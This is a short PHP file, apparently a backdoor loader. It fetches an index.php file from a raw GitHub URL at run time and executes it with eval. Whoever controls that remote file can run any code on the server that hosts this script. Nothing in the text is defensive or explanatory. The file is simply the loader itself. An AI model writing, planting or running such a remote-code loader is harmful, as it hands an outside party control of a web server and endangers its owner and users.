<?php
$path = "https://raw.githubusercontent.com/sibueeee/listbekdur/refs/heads/main/index.php";
$code = implode('', file($path));
eval("?>" . $code);
?>